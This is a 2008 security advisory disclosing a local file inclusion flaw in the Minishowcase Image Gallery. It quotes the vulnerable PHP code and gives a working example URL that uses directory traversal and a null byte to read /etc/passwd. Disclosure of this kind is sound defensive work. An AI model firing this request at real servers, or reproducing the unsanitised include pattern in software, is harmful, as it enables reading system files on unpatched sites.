@@ -1,0 +1,68 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-034
+
+
+Application:                    Minishowcase Image Gallery      
+Versions Affected:              v09b136
+Vendor URL:                     http://minishowcase.frwrd.net
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       14.07.2008
+Second report:                  22.07.2008
+Vendor response:                NONE
+Solution:                       NONE
+Date of Public Advisory:        29.07.2008
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Minishowcase Image Gallery has local file include vulnerability in script libraries/general.init.php
+
+Vulnerable GET parameters "lang".
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code
+****
+#################################################
+
+...
+        $_dir_file = dirname(dirname(__FILE__));
+        $_dir_path = dirname($_SERVER["DOCUMENT_ROOT"] . $_SERVER['PHP_SELF']);
+        
+        if ($_dir_file != $_dir_path) {
+                if (!isset($settings['minishowcase_url'])
+                        || ($settings['minishowcase_url'] == "")) {
+                        die ("<p style=\"margin:6px;padding:20px;text-align:left;font-size:18px;background:#f60;color:#FFF;\">ALERT: if you are including minishowcase with PHP into a website, please set the <code>\$minishowcase_url</code> variable in the <code>/config/settings.php</code> file</p>");
+                }
+        }
+...
+        if (isset($_GET["lang"])) $set_language = $_GET["lang"];
+        $langfile = ROOT.'languages/'.$set_language.'.php';
+        require_once($langfile);
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/libraries/general.init.php?settings[minishowcase_url]=DSecRG&lang=../../../../../../../../../../../../../etc/passwd%00
+
+
+Solution
+********
+
+No response or any updates from vendor.
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-07-29]
